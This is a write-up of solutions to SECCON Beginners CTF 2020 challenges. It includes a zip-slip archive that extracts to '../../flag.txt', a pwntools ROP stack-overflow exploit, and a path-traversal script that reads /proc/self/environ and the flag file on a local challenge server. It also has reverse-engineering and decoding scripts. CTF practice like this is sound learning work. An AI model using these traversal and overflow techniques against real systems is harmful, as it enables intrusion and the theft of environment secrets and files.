# SECCON Beginners CTF 2020

- https://github.com/SECCON/Beginners_CTF_2020

## web

### unzip

- https://www.youtube.com/watch?v=Lpeh8yN7NAg&t=7590s

#### Solution 1

```zsh
echo hello > __X__Xflag.txt
7z a 1.zip __X__Xflag.txt
hexer 1.zip
```

hexer で編集する。
`__X__Xflag.txt` が2か所あるので、`../../flag.txt` に書き換える。

## rev

### mask

IDA または Ghidra で逆コンパイル

```c
local_98[local_e0] = local_d8[local_e0] & 0x75;
local_58[local_e0] = local_d8[local_e0] & 0xeb;

"atd4`qdedtUpetepqeUdaaeUeaqau"
"c`b bk`kj`KbababcaKbacaKiacki"
```

#### Solution 1

- https://gchq.github.io/CyberChef/#recipe=OR(%7B'option':'UTF8','string':'c%60b%20bk%60kj%60KbababcaKbacaKiacki'%7D)&input=YXRkNGBxZGVkdFVwZXRlcHFlVWRhYWVVZWFxYXU

#### Solution 2

```python
#!/usr/bin/env python3
a = bytes(b'atd4`qdedtUpetepqeUdaaeUeaqau')
b = bytes(b'c`b bk`kj`KbababcaKbacaKiacki')
print(bytes([x | y for x, y in zip(a, b)]).decode())
```

#### Solution 3

```python
#!/usr/bin/env python3
a = b'atd4`qdedtUpetepqeUdaaeUeaqau'
b = b'c`b bk`kj`KbababcaKbacaKiacki'
answer = ''
for i in range(len(a)):
    for c in range(0x20, 0x7f):
        if c & 0x75 == a[i] and c & 0xeb == b[i]:
            answer += chr(c)
            print(answer)
            break
```

#### solution 4

```python
#!/usr/bin/env python3
import angr
import claripy
proj = angr.Project('./mask', auto_load_libs=False)
max_len = 64
prefix = b'ctf4b{'
arg1 = claripy.BVS('arg1', 8*max_len)
state = proj.factory.entry_state(args=[proj.filename, arg1])
for c in arg1.chop(8):
    state.solver.add(claripy.Or(claripy.And(c >= 0x20, c <= 0x7e), c == 0))
for i, ch in enumerate(prefix):
    state.solver.add(arg1.get_byte(i) == ch)
simgr = proj.factory.simgr(state)
simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1),
              avoid=lambda s: b'Wrong' in s.posix.dumps(1))
print(simgr)
if simgr.found:
    found = simgr.found[0]
    flag = found.solver.eval(arg1, cast_to=bytes)
    print('FLAG:', flag.split(b'\x00')[0].decode())
else:
    print('No solution found')
```

## pwn

### beginners_stack

#### Solution 1

```python
#!/usr/bin/env python3
from pwn import ELF, ROP, context, p64, process, log, remote
exe = context.binary = ELF('chall')
# io = process([exe.path])
io = remote('::1', 9001)
rop = ROP(exe)
rop.raw(rop.ret)
io.sendafter(b'Input: ', b'A'*0x20 + b'B'*0x8 + rop.chain()
             + p64(exe.symbols['win']))
io.sendlineafter(b'Congratulations!\n', b'cat flag.txt')
log.success(io.recvall(2).decode())
io.close()
```

## misc

### readme

#### Solution 1

```python
#!/usr/bin/env python3
from pwn import log, remote
import re
io = remote('::1', 9712)
io.sendlineafter(b'File: ', b'/proc/self/environ')
log.success('CWD: %s', re.findall(
    b'PWD=(.+?)\x00', io.recvline())[0].decode(errors='ignore'))
io.close()
io = remote('::1', 9712)
io.sendlineafter(b'File: ', b'/proc/self/cwd/../flag')
log.success('FLAG: %s', io.recvline().decode(errors='ginore'))
io.close()
```

### emoemoencode

#### Solution 1

```python
#!/usr/bin/env python3
chars = [ord(ch) for ch in open('problem.txt').read()]
d = chars[0] - ord(b'c')
for ch in chars[:-1]:
    print(chr(ch - d), end='')
```
